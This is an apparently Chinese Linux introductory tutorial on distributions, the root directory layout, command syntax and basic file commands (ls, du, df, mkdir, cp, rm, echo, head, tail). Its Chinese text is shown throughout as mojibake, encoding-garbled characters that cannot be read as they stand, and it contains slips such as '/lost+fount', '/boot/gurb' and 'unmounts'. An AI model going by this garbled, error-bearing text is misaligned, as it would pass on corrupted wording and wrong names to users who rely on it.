ä¸Šä¸€ä¸ªâ€ç•Œé¢â€è½¯ä»¶ï¼Œæ‰èƒ½è®©ç”¨æˆ·å»ä½¿ç”¨ï¼Œâ€ç•Œé¢â€åˆ†ä¸¤ç±»ï¼š aã€å‘½ä»¤è¡Œç•Œé¢CLI SHELLï¼ˆæœ‰å¾ˆå¤šç§ï¼Œæœ€æµè¡Œçš„ä¸€ç§æ˜¯bash shellï¼‰ bã€å›¾å½¢ç•Œé¢GUI SHELLï¼ˆä¹Ÿæœ‰å¾ˆå¤šç§ï¼Œç›®å‰æœ€æµè¡Œçš„æœ‰ä¸¤ç§ï¼šgnomeå’Œkdeï¼‰ 4. Linuxå†…æ ¸ä¸¥æ ¼æ¥è®²ï¼ŒLinuxä¸æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼ŒLinuxåªæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸­çš„å†…æ ¸ã€‚ å†…æ ¸å»ºç«‹äº†è®¡ç®—æœºè½¯ä»¶ä¸ç¡¬ä»¶ä¹‹é—´é€šè®¯çš„å¹³å°ï¼Œå†…æ ¸æä¾›ç³»ç»ŸæœåŠ¡ï¼Œæ¯”å¦‚æ–‡ä»¶ç®¡ç†ã€è™šæ‹Ÿå†…å­˜ã€è®¾å¤‡I/Oã€è¿›ç¨‹ç®¡ç†ç­‰ã€‚ å†…æ ¸å®˜ç½‘ï¼š[http://www.kernel.org/]{.underline}ã€‚ç›®å‰æœ€æ–°çš„å†…æ ¸ç‰ˆæœ¬ï¼š4.13.5 è¦æ³¨æ„åŒºåˆ†linuxå‘å‹ç‰ˆæœ¬å’Œlinuxå†…æ ¸ç‰ˆæœ¬ã€‚ä¸¤è€…ä¸æ˜¯åŒä¸€ä¸ªäº‹ç‰© ä¸‹é¢è¿™ä½æ˜¯Linuxå†…æ ¸çš„ä½œè€…ï¼š è¿™æ˜¯Linuxçš„logo 5. å¸¸è§å‘è¡Œç‰ˆçº¢å¸½ä¼ä¸šç³»ç»Ÿï¼ˆRedHat Enterprise Linux, RHELï¼‰ å…¨çƒæœ€å¤§çš„å¼€æºæŠ€æœ¯å‚å•†ï¼Œå…¨ä¸–ç•Œå†…ä½¿ç”¨æœ€å¹¿æ³›çš„Linuxå‘å¸ƒå¥—ä»¶ï¼Œ æä¾›æ€§èƒ½ä¸ç¨³å®šæ€§æå¼ºçš„Linuxå¥—ä»¶ç³»ç»Ÿå¹¶æ‹¥æœ‰å®Œå–„çš„å…¨çƒæŠ€æœ¯æ”¯æŒã€‚ å®˜ç½‘ï¼š[http://www.redhat.com]{.underline} ç¤¾åŒºä¼ä¸šæ“ä½œç³»ç»Ÿï¼ˆCentOSï¼‰ æœ€åˆæ˜¯å°†çº¢å¸½ä¼ä¸šç³»ç»Ÿâ€é‡æ–°ç¼–è¯‘/å‘å¸ƒâ€ç»™ç”¨æˆ·å…è´¹ä½¿ç”¨è€Œå¹¿æ³›ä½¿ç”¨ï¼Œ å½“å‰å·²æ­£å¼åŠ å…¥çº¢å¸½å…¬å¸å¹¶ç»§ç»­ä¿æŒå…è´¹ï¼ˆéšRHELæ›´æ–°è€Œæ›´æ–°ï¼‰ã€‚ å®˜ç½‘ï¼š[http://www.centos.org/]{.underline} çº¢å¸½ç”¨æˆ·æ¡Œé¢ç‰ˆï¼ˆFedora [Linux]ï¼‰ æœ€åˆç”±çº¢å¸½å…¬å¸å‘èµ·çš„æ¡Œé¢ç‰ˆç³»ç»Ÿå¥—ä»¶ï¼ˆç›®å‰å·²ç»ä¸é™äºæ¡Œé¢ç‰ˆï¼‰ï¼Œ ç”¨æˆ·å¯å…è´¹ä½“éªŒåˆ°æœ€æ–°çš„æŠ€æœ¯æˆ–å·¥å…·ï¼Œè€ŒåŠŸèƒ½æˆç†ŸååŠ å…¥åˆ°RHELä¸­ã€‚ å®˜ç½‘ï¼š[http://fedora.redhat.com]{.underline} å›½é™…åŒ–ç»„ç»‡çš„å¼€æºæ“ä½œç³»ç»Ÿï¼ˆDebianï¼‰ æä¾›è¶…è¿‡37500ç§ä¸åŒçš„è‡ªç”±è½¯ä»¶ä¸”æ‹¥æœ‰å¾ˆé«˜çš„è®¤å¯åº¦ï¼Œ å¯¹äºå„ç±»å†…æ ¸æ¶æ„æ”¯æŒæ€§è‰¯å¥½ï¼Œç¨³å®šæ€§ã€å®‰å…¨æ€§å¼ºæ›´æœ‰å…è´¹çš„æŠ€æœ¯æ”¯æŒã€‚ å®˜ç½‘ï¼š[http://www.debian.org/]{.underline} åŸºäºDebiançš„æ¡Œé¢ç‰ˆï¼ˆUbuntuï¼‰ Ubuntuæ˜¯ä¸€æ¬¾åŸºäºDebianæ´¾ç”Ÿçš„äº§å“ï¼Œå¯¹æ–°æ¬¾ç¡¬ä»¶å…·æœ‰æå¼ºçš„å…¼å®¹èƒ½åŠ›ã€‚ æ™®éè®¤ä¸ºUbuntuä¸Fedoraéƒ½æ˜¯æå…¶å‡ºè‰²çš„LINUXæ¡Œé¢ç³»ç»Ÿã€‚ å®˜ç½‘ï¼š[http://www.ubuntulinux.org/]{.underline} å½“ç„¶è¿˜æœ‰å›½å†…çš„å›½é˜²ç§‘æŠ€å¤§å­¦å‘è¡Œéº’éºŸkylinå’Œä¸­ç§‘é™¢å‘è¡Œçº¢æ——RedFlag 2&gt; Linuxæ–‡ä»¶ç³»ç»Ÿ1. CentOSçš„ç›®å½•ç»“æ„ 2. æ ¹ç›®å½•ä¸‹æ¯ä¸ªç›®å½•çš„ç®€å•è§£é‡Š /**ï¼š**æ ¹ç›®å½•ï¼Œä¸€èˆ¬æ ¹ç›®å½•ä¸‹åªå­˜æ”¾ç›®å½•ï¼Œä¸è¦å­˜æ”¾æ–‡ä»¶ï¼Œ/etcã€/binã€/devã€/libã€/sbinåº”è¯¥å’Œæ ¹ç›®å½•æ”¾ç½®åœ¨ä¸€ä¸ªåˆ†åŒºä¸­ /bin:/usr/bin: å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚å¸¸ç”¨çš„å‘½ä»¤lsã€tarã€mvã€catç­‰ /boot**ï¼š**æ”¾ç½®linuxç³»ç»Ÿå¯åŠ¨æ—¶ç”¨åˆ°çš„ä¸€äº›æ–‡ä»¶ã€‚/boot/vmlinuzä¸ºlinuxçš„å†…æ ¸æ–‡ä»¶ï¼Œä»¥åŠ/boot/gurbã€‚å»ºè®®å•ç‹¬åˆ†åŒºï¼Œåˆ†åŒºå¤§å°100Må³å¯ /dev**ï¼š**å­˜æ”¾linuxç³»ç»Ÿä¸‹çš„è®¾å¤‡æ–‡ä»¶ï¼Œè®¿é—®è¯¥ç›®å½•ä¸‹æŸä¸ªæ–‡ä»¶ï¼Œç›¸å½“äºè®¿é—®æŸä¸ªè®¾å¤‡ï¼Œå¸¸ç”¨çš„æ˜¯æŒ‚è½½å…‰é©±mount /dev/cdrom /mnt /etc**ï¼š**ç³»ç»Ÿé…ç½®æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ï¼Œä¸å»ºè®®åœ¨æ­¤ç›®å½•ä¸‹å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡è¦çš„é…ç½®æ–‡ä»¶æœ‰/etc/inittabã€/etc/gatewaysã€/etc/resolv.confã€/etc/fstabã€/etc/init.dã€/etc/X11ã€/etc/sysconfigã€/etc/xinetd.dä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹å‰è®°å¾—å¤‡ä»½ã€‚æ³¨ï¼š/etc/X11å­˜æ”¾ä¸x windowsæœ‰å…³çš„è®¾ç½® /home**ï¼š**ç³»ç»Ÿé»˜è®¤çš„ç”¨æˆ·å®¶ç›®å½•ï¼Œæ–°å¢ç”¨æˆ·è´¦å·æ—¶ï¼Œç”¨æˆ·çš„å®¶ç›®å½•éƒ½å­˜æ”¾åœ¨æ­¤ç›®å½•ä¸‹ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œtestè¡¨ç¤ºç”¨æˆ·testçš„å®¶ç›®å½•ã€‚å»ºè®®å•ç‹¬åˆ†åŒºï¼Œå¹¶è®¾ç½®è¾ƒå¤§çš„ç£ç›˜ç©ºé—´ï¼Œæ–¹ä¾¿ç”¨æˆ·å­˜æ”¾æ•°æ® /lib:/lib64:/usr/lib:/usr/local/lib**ï¼š**ç³»ç»Ÿä½¿ç”¨çš„å‡½æ•°åº“çš„ç›®å½•ï¼Œç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦è°ƒç”¨ä¸€äº›é¢å¤–çš„å‚æ•°æ—¶éœ€è¦å‡½æ•°åº“çš„ååŠ©ï¼Œæ¯”è¾ƒé‡è¦çš„ç›®å½•ä¸º/lib/modules /lost+fount**ï¼š**ç³»ç»Ÿå¼‚å¸¸äº§ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šå°†ä¸€äº›é—å¤±çš„ç‰‡æ®µæ”¾ç½®äºæ­¤ç›®å½•ä¸‹ï¼Œé€šå¸¸è¿™ä¸ªç›®å½•ä¼šè‡ªåŠ¨å‡ºç°åœ¨è£…ç½®ç›®å½•ä¸‹ã€‚å¦‚åŠ è½½ç¡¬ç›˜äº/disk ä¸­ï¼Œæ­¤ç›®å½•ä¸‹å°±ä¼šè‡ªåŠ¨äº§ç”Ÿç›®å½•/disk/lost+found /mnt:/media**ï¼š**å…‰ç›˜é»˜è®¤æŒ‚è½½ç‚¹ï¼Œé€šå¸¸å…‰ç›˜æŒ‚è½½äº/mnt/cdromä¸‹ï¼Œä¹Ÿä¸ä¸€å®šï¼Œå¯ä»¥é€‰æ‹©ä»»æ„ä½ç½®è¿›è¡ŒæŒ‚è½½ /opt**ï¼š**ç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚å¦‚ï¼šFC4ä½¿ç”¨çš„Fedora ç¤¾ç¾¤å¼€å‘è½¯ä»¶ï¼Œå¦‚æœæƒ³è¦è‡ªè¡Œå®‰è£…æ–°çš„KDEæ¡Œé¢è½¯ä»¶ï¼Œå¯ä»¥å°†è¯¥è½¯ä»¶å®‰è£…åœ¨è¯¥ç›®å½•ä¸‹ã€‚ä»¥å‰çš„Linuxç³»ç»Ÿä¸­ï¼Œä¹ æƒ¯æ”¾ç½®åœ¨ /usr/localç›®å½•ä¸‹option /proc**ï¼š*æ­¤ç›®å½•çš„æ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œå¦‚ç³»ç»Ÿæ ¸å¿ƒï¼Œå¤–éƒ¨è®¾å¤‡ï¼Œç½‘ç»œçŠ¶æ€ï¼Œç”±äºæ•°æ®éƒ½å­˜æ”¾äºå†…å­˜ä¸­ï¼Œæ‰€ä»¥ä¸å ç”¨ç£ç›˜ç©ºé—´ï¼Œæ¯”è¾ƒé‡è¦çš„ç›®å½•æœ‰/proc/cpuinfoã€/proc/interruptsã€/proc/dmaã€/proc/ioportsã€/proc/net/ç­‰process /root**ï¼š**ç³»ç»Ÿç®¡ç†å‘˜rootçš„å®¶ç›®å½•ï¼Œç³»ç»Ÿç¬¬ä¸€ä¸ªå¯åŠ¨çš„åˆ†åŒºä¸º/ï¼Œæ‰€ä»¥æœ€å¥½å°†/rootå’Œ/æ”¾ç½®åœ¨ä¸€ä¸ªåˆ†åŒºä¸‹ /sbin:/usr/sbin:/usr/local/sbin**ï¼š**æ”¾ç½®ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„å¯æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚fdiskã€shutdownã€mountç­‰ã€‚ä¸/binä¸åŒçš„æ˜¯ï¼Œè¿™å‡ ä¸ªç›®å½•æ˜¯ç»™ç³»ç»Ÿç®¡ç†å‘˜rootä½¿ç”¨çš„å‘½ä»¤ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½â€æŸ¥çœ‹â€è€Œä¸èƒ½è®¾ç½®å’Œä½¿ç”¨ã€‚ /selinux**ï¼š**selinuxè½¯ä»¶ç›®å½•ï¼Œç”¨äºä¿è¯ç³»ç»Ÿå®‰å…¨ /srv**ï¼š**æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦è®¿é—®çš„æ•°æ®ç›®å½•ï¼Œå¦‚wwwæœåŠ¡éœ€è¦è®¿é—®çš„ç½‘é¡µæ•°æ®å­˜æ”¾åœ¨/srv/wwwå†…service /sys**ï¼š**ç±»ä¼¼äº/procçš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œå­˜æ”¾å†…æ ¸æ•°æ®ä¿¡æ¯ /tmp**ï¼š**ä¸€èˆ¬ç”¨æˆ·æˆ–æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºä¸´æ—¶å­˜æ”¾æ–‡ä»¶çš„ç›®å½•,ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®,é‡è¦æ•°æ®ä¸å¯æ”¾ç½®åœ¨æ­¤ç›®å½•ä¸‹ /usr**ï¼šåº”ç”¨ç¨‹åºå­˜æ”¾ç›®å½•ï¼Œ /usr/bin å­˜æ”¾åº”ç”¨ç¨‹åº /usr/share å­˜æ”¾å…±äº«æ•°æ® /usr/lib å­˜æ”¾ä¸èƒ½ç›´æ¥è¿è¡Œçš„ï¼Œå´æ˜¯è®¸å¤šç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ä¸€äº›å‡½æ•°åº“æ–‡ä»¶ /usr/local:å­˜æ”¾è½¯ä»¶å‡çº§åŒ… /usr/share/doc: ç³»ç»Ÿè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½• /usr/share/man: ç¨‹åºè¯´æ˜æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼Œä½¿ç”¨man lsæ—¶ä¼šæŸ¥è¯¢/usr/share/man/man1/ls.1.gzçš„å†…å®¹å»ºè®®å•ç‹¬åˆ†åŒºï¼Œè®¾ç½®è¾ƒå¤§çš„ç£ç›˜ç©ºé—´ usr**ï¼šuser share resources/unix share resouces /var**ï¼š**æ”¾ç½®ç³»ç»Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­ç»å¸¸å˜åŒ–çš„æ–‡ä»¶ï¼Œå¦‚ï¼š /var/logï¼šéšæ—¶æ›´æ”¹çš„æ—¥å¿—æ–‡ä»¶ /var/log/messageï¼šæ‰€æœ‰çš„ç™»å½•æ–‡ä»¶å­˜æ”¾ç›®å½• /var/spool/mailï¼šé‚®ä»¶å­˜æ”¾çš„ç›®å½• /var/runï¼šç¨‹åºæˆ–æœåŠ¡å¯åŠ¨ ä½¿ç”¨å»ºè®®ï¼š ç”¨æˆ·åº”è¯¥å°†æ–‡ä»¶å­˜å‚¨åœ¨è‡ªå·±çš„ä¸»ç›®å½•åŠå…¶å­ç›®å½•ä¸‹ ç³»ç»Ÿç»å¤§å¤šæ•°è®¾ç½®éƒ½åœ¨/etcç›®å½•ä¸‹ ä¸è¦ä¿®æ”¹/æˆ–è€…/usrç›®å½•ä¸‹çš„ä»»ä½•å†…å®¹ï¼Œé™¤éä½ çœŸçš„æ¸…æ¥šä½ åœ¨åšä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¯´/ç›®å½•æœ€å¥½å’Œå®‰è£…å¥½ç³»ç»Ÿä¹‹åˆä¿æŒä¸€è‡´ å¤§å¤šæ•°å·¥å…·å’Œåº”ç”¨è½¯ä»¶ç¨‹åºéƒ½å®‰è£…åœ¨/binï¼Œ/sbinï¼Œ/usr/binï¼Œ/usr/sbinï¼Œ/usr/local/bin æ–‡ä»¶æˆ–è€…ç›®å½•éƒ½æœ‰å”¯ä¸€çš„ç»å¯¹è·¯å¾„ï¼Œæ²¡æœ‰ç›˜ç¬¦çš„æ¦‚å¿µ 3&gt; Linuxå‘½ä»¤ç»ˆç«¯1. Linux çš„å‘½ä»¤æ ¼å¼ï¼šå‘½ä»¤é€‰é¡¹ å‘½ä»¤å‚æ•°æ³¨æ„ï¼šä¸‰è€…ä¹‹é—´è¦ç©ºæ ¼éš”å¼€ï¼Œå…¶ä¸­å‘½ä»¤é€‰é¡¹åˆ†ä¸ºé•¿æ ¼å¼å’ŒçŸ­æ ¼å¼ã€‚ çŸ­æ ¼å¼ç”¨â€™-â€˜è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š-lï¼Œ é•¿æ ¼å¼ç”¨â€â€“â€è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼šâ€“helpï¼Œ ä¹Ÿå¯ä»¥ä½¿ç”¨ç»„åˆæ ¼å¼ï¼Œæ¯”å¦‚ï¼š-a -l ç­‰ä»·äº-laæˆ–è€…-al 2. Linuxçš„é»˜è®¤å‘½ä»¤æç¤ºç¬¦ï¼š#ï¼šç®¡ç†å‘˜ç”¨æˆ· $ï¼šæ™®é€šç”¨æˆ· PS: Linuxä»¥å›è½¦é”®è¡¨ç¤ºå‘½ä»¤ç»“æŸï¼Œå¦‚æœ linuxå‘½ä»¤éœ€è¦æŠ˜è¡Œè¾“å…¥ï¼Œé‚£ä¹ˆå¯ä»¥ä»¥ \è¡¨ç¤ºæ¯è¡Œç»“æŸ 4&gt; å¸¸ç”¨å‘½ä»¤å½’çº³åˆ†ç±»åŸºæœ¬å‘½ä»¤ æ–‡ä»¶ç®¡ç† mkdir, rmdir, mv, rm, cp, touch, cat, tac, echo, more, less, head, tail, file, find, rename, ln, pwd, scp, alias ç£ç›˜ç®¡ç† ls, cd, du, df, mount, unmounts, fdisk æ–‡æ¡£å¤„ç† wc, sort, uniq, cut, sed, awk, grep, vi, diff ç”¨æˆ·å’Œç»„ useradd, usermod, passwd, userdel, groupadd, groupdel, chgrp, su æ–‡ä»¶ä¼ è¾“ get, put, wget ç½‘ç»œé€šä¿¡ telnet, nc, ifconfig, ping, netstat, ip, host å¤‡ä»½å‹ç¼© gzip, bzip2, bunzip2, tar, zip ç³»ç»Ÿç®¡ç† exit, kill, last, ps, top, free, pstree, reboot, halt, shutdown, sudo, who, w, whoami, whereis, which, last, whatis ç³»ç»Ÿè®¾ç½® clear, set, unset, hwclock, time, date, å…¶ä»– history, hostname, nohup, service, init, rpm, ssh, cal, yum ç½‘ç«™é€ŸæŸ¥http://man.linuxde.net/ http://www.jb51.net/linux/ https://jaywcjlove.github.io/linux-command ps: ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­, ç”¨ man xx, ä¹Ÿå¯ä»¥æŸ¥çœ‹å‘½ä»¤ä¿¡æ¯ 5&gt; å¸¸ç”¨æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤è¯¦è§£ç£ç›˜ç®¡ç† cd change directory å¸¸ä½¿ç”¨æ–¹å¼ï¼š cd sourcedir è¿›å…¥ç”¨æˆ·ä¸»ç›®å½• cd ~ è¿›å…¥ç”¨æˆ·ä¸»ç›®å½• cd - è¿”å›è¿›å…¥æ­¤ç›®å½•ä¹‹å‰æ‰€åœ¨çš„ç›®å½• cd .. è¿”å›ä¸Šçº§ç›®å½•ï¼ˆè‹¥å½“å‰ç›®å½•ä¸ºâ€/â€œï¼Œåˆ™æ‰§è¡Œå®Œåè¿˜åœ¨â€/â€œï¼›â€..â€ä¸ºä¸Šçº§ç›®å½•çš„æ„æ€ï¼‰ cd ../.. è¿”å›ä¸Šä¸¤çº§ç›®å½• pwd print working directory pwd æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½• ls listï¼šæ˜¾ç¤ºç›®å½•å†…å®¹åˆ—è¡¨ ä½¿ç”¨æ ¼å¼ï¼šls é€‰é¡¹ ç›®å½•æˆ–æ–‡ä»¶å å¸¸ç”¨é€‰é¡¹ -lï¼šè¯¦ç»†ä¿¡æ¯æ˜¾ç¤º -aï¼šæ˜¾ç¤ºæ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ -Aï¼šç±»ä¼¼äºâ€œ-aâ€ï¼Œä½†ä¸æ˜¾ç¤ºâ€œ.â€å’Œâ€œ..â€ç›®å½•çš„ä¿¡æ¯ -Rï¼šé€’å½’æ˜¾ç¤ºå†…å®¹ -hï¼šä»¥å‹å¥½æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶å¤§å° ä¾‹å­ï¼š ls -l ## åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œ ä¹Ÿå¯ä»¥å†™ä½œ ll ls -lah ## ä»¥å‹å¥½æ–¹å¼æ˜¾ç¤ºåŒ…æ‹¬éšè—æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ du disk usageï¼šæ˜¾ç¤ºæ¯ä¸ªæ–‡ä»¶å’Œç›®å½•çš„ç£ç›˜ä½¿ç”¨ç©ºé—´ ä½¿ç”¨æ ¼å¼ï¼šdu é€‰é¡¹ ç›®å½•æˆ–æ–‡ä»¶å å¸¸ç”¨é€‰é¡¹ï¼š -aï¼šç»Ÿè®¡æ—¶åŒ…æ‹¬æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…åªç»Ÿè®¡ç›®å½• -hï¼šä»¥æ›´æ˜“è¯»çš„å­—èŠ‚å•ä½ï¼ˆKã€Mç­‰ï¼‰æ˜¾ç¤ºä¿¡æ¯ -sï¼šåªç»Ÿè®¡æ¯ä¸ªå‚æ•°æ‰€å ç”¨ç©ºé—´æ€»çš„å¤§å° ä¾‹å­ï¼š du -ah ## df disk freeï¼šæ˜¾ç¤ºç£ç›˜ç›¸å…³ä¿¡æ¯ å¸¸ç”¨é€‰é¡¹ï¼š -hï¼šä»¥æ›´æ˜“è¯»çš„å­—èŠ‚å•ä½ï¼ˆKã€Mç­‰ï¼‰æ˜¾ç¤ºä¿¡æ¯ -Tï¼šæ˜¾ç¤ºåˆ†åŒºæ ¼å¼ ä¾‹å­ï¼š df -h ## æ˜¾ç¤ºç£ç›˜ä¿¡æ¯ï¼Œä»¥å‹å¥½æ–¹å¼ df -T -h ## ä»¥å‹å¥½æ ¼å¼æ˜¾ç¤ºç£ç›˜ä¿¡æ¯ï¼Œå¹¶ä¸”é™„åŠ ç£ç›˜æ ¼å¼ æ–‡ä»¶ç®¡ç† touch åˆ›å»ºç©ºæ–‡ä»¶ æˆ–æ›´æ–°æ–‡ä»¶æ—¶é—´æ ‡è®° ä½¿ç”¨æ ¼å¼ï¼š touch æ–‡ä»¶å file æŸ¥çœ‹æ–‡ä»¶ç±»å‹ ä½¿ç”¨æ ¼å¼ï¼š file æ–‡ä»¶å æ ¹æ®æ–‡ä»¶å†…å®¹æ ¼å¼åˆ¤æ–­æ–‡ä»¶ç±»å‹ã€‚è€Œä¸æ˜¯æ ¹æ®åç¼€å mkdir åˆ›å»ºæ–‡ä»¶å¤¹ make directory ä½¿ç”¨æ ¼å¼ï¼šmkdir é€‰é¡¹ å‚æ•° å¸¸ç”¨é€‰é¡¹ï¼š -pï¼šå·²çº§è”çš„æ–¹å¼åˆ›å»ºæ–‡ä»¶å¤¹ ä¾‹å­ï¼š mkdir -p /root/ma/niu/zhu/dagou ## ä¸Šçº§ç›®å½•ä¸å­˜åœ¨è‡ªåŠ¨åˆ›å»ºä¸Šä¸€çº§ç›®å½•ï¼Œå¸¸ç”¨ cp å¤åˆ¶æ–‡ä»¶ ä½¿ç”¨æ ¼å¼ï¼š cp é€‰é¡¹ æºæ–‡ä»¶æˆ–ç›®å½•â€¦ ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½• å¸¸ç”¨é€‰é¡¹ï¼š -rï¼šé€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•æ ‘ -pï¼šä¿æŒæºæ–‡ä»¶çš„å±æ€§ä¸å˜ -iï¼šéœ€è¦è¦†ç›–æ–‡ä»¶æˆ–ç›®å½•æ—¶è¿›è¡Œæé†’ rm åˆ é™¤æ–‡ä»¶æˆ–ç›®å½• ä½¿ç”¨æ ¼å¼ï¼šrm [é€‰é¡¹] æ–‡ä»¶æˆ–ç›®å½• å¸¸ç”¨é€‰é¡¹ï¼š -fï¼šå¼ºè¡Œåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸è¿›è¡Œæé†’ -iï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•æ—¶æé†’ç”¨æˆ·ç¡®è®¤ -rï¼šé€’å½’åˆ é™¤æ•´ä¸ªç›®å½•æ ‘ ä¾‹å­ï¼š rm -rf /root/ma/ ## ä¸æé†’é€’å½’åˆ é™¤æ•´ä¸ªç›®å½•ï¼Œæ…ç”¨æ…ç”¨æ…ç”¨ mv ç§»åŠ¨æ–‡ä»¶ å¦‚æœä¸æºæ–‡ä»¶ä½ç½®ä¸€æ ·ï¼Œåˆ™ç›¸å½“äºé‡å‘½å ä½¿ç”¨æ ¼å¼ï¼š mv [é€‰é¡¹]â€¦ æºæ–‡ä»¶æˆ–ç›®å½•â€¦ ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½• å¸¸ç”¨é€‰é¡¹ï¼š -fï¼šè‹¥ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•ä¸ç°æœ‰çš„æ–‡ä»¶æˆ–ç›®å½•é‡å¤ï¼Œåˆ™ç›´æ¥è¦†ç›–ç°æœ‰çš„æ–‡ä»¶æˆ–ç›®å½• -uï¼šå½“æºæ–‡ä»¶æ¯”ç›®æ ‡æ–‡ä»¶æ–°æˆ–è€…ç›®æ ‡æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œæ‰æ‰§è¡Œç§»åŠ¨æ“ä½œ rmdir åˆ é™¤ç©ºæ–‡ä»¶å¤¹ å¸¸ç”¨é€‰é¡¹ï¼š -pæˆ–â€“parentsï¼šåˆ é™¤æŒ‡å®šç›®å½•åï¼Œè‹¥è¯¥ç›®å½•çš„ä¸Šå±‚ç›®å½•å·²å˜æˆç©ºç›®å½•ï¼Œåˆ™å°†å…¶ä¸€å¹¶åˆ é™¤ï¼› rmdir -p /root/aa/bb/cc/dd/ee åˆ é™¤æ–‡ä»¶å¤¹eeï¼Œå¦‚æœåˆ é™¤eeåï¼Œddå˜ä¸ºç©ºï¼Œåˆ™åˆ é™¤ddï¼Œä¾æ¬¡ç±»æ¨ cat è¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š å¸¸ç”¨é€‰é¡¹ï¼š -næˆ–â€“numberï¼šç”±1å¼€å§‹å¯¹æ‰€æœ‰è¾“å‡ºçš„è¡Œæ•°ç¼–å· cat /home/hadoop/data.txt ## æŸ¥çœ‹æ–‡ä»¶å†…å®¹ tac å€’åºè¾“å‡ºæ–‡ä»¶å†…å®¹ tac /home/hadoop/data.txt echo è¾“å‡ºæŒ‡å®šçš„å­—ç¬¦ä¸²æˆ–è€…å˜é‡ å¸¸ç”¨é€‰é¡¹ï¼š -eï¼šè‹¥å­—ç¬¦ä¸²ä¸­å‡ºç°ä»¥ä¸‹å­—ç¬¦ï¼Œåˆ™ç‰¹åˆ«åŠ ä»¥å¤„ç†ï¼Œè€Œä¸ä¼šå°†å®ƒå½“æˆä¸€èˆ¬æ–‡å­—è¾“å‡ºï¼š \a å‘å‡ºè­¦å‘Šå£°ï¼› \b åˆ é™¤å‰ä¸€ä¸ªå­—ç¬¦ï¼› \c æœ€åä¸åŠ ä¸Šæ¢è¡Œç¬¦å·ï¼› \f æ¢è¡Œä½†å…‰æ ‡ä»æ—§åœç•™åœ¨åŸæ¥çš„ä½ç½®ï¼› \n æ¢è¡Œä¸”å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼› \r å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼Œä½†ä¸æ¢è¡Œï¼› \t æ’å…¥tabï¼› \v ä¸\fç›¸åŒï¼› \ æ’å…¥\å­—ç¬¦ï¼› \nnn æ’å…¥nnnï¼ˆå…«è¿›åˆ¶ï¼‰æ‰€ä»£è¡¨çš„ASCIIå­—ç¬¦ï¼› ä¾‹å­ï¼š echo â€˜maâ€™ ## è¾“å‡ºma echo -e â€˜ma\nâ€™ ## æ‰“å°maä¹‹åæ¢è¡Œ echo -ne â€˜maâ€™ â€˜zhonghuaâ€™ ## æ‰“å°å®Œä¸æ¢è¡Œ echo â€˜maâ€™ &gt; ma.dat ## è¦†ç›– echo â€˜maâ€™ &gt;&gt; ma.dat ## è¿½åŠ  echo $PWD ## è¾“å‡ºå˜é‡å†…å®¹ head åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å¼€å¤´è‹¥å¹²è¡Œ é»˜è®¤æ˜¾ç¤º10è¡Œ å¸¸ç”¨é€‰é¡¹ï¼š -n&lt;æ•°å­—&gt;ï¼šæŒ‡å®šæ˜¾ç¤ºå¤´éƒ¨å†…å®¹çš„è¡Œæ•°ï¼› ä¾‹å­ï¼š head -n 5 install.log ## æ˜¾ç¤ºè¯¥æ–‡ä»¶å‰äº”è¡Œå†…å®¹ tail åœ¨å±å¹•ä¸Šæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾è‹¥å¹²è¡Œ å¸¸ç”¨é€‰é¡¹ï¼š -fï¼šæ˜¾ç¤ºæ–‡ä»¶æœ€æ–°è¿½åŠ çš„å†…å®¹ tail -f install.log ## æ˜¾ç¤ºæœ€æ–°è¿½åŠ çš„å†…å®¹ ## æ˜¾ç¤ºæ–‡ä»¶fileçš„æœ€å10è¡Œ tail -1 file ## æ˜¾ç¤ºæ–‡ä»¶fileæœ€åä¸€è¡Œçš„å†…å®¹ tail -c 10 file ## 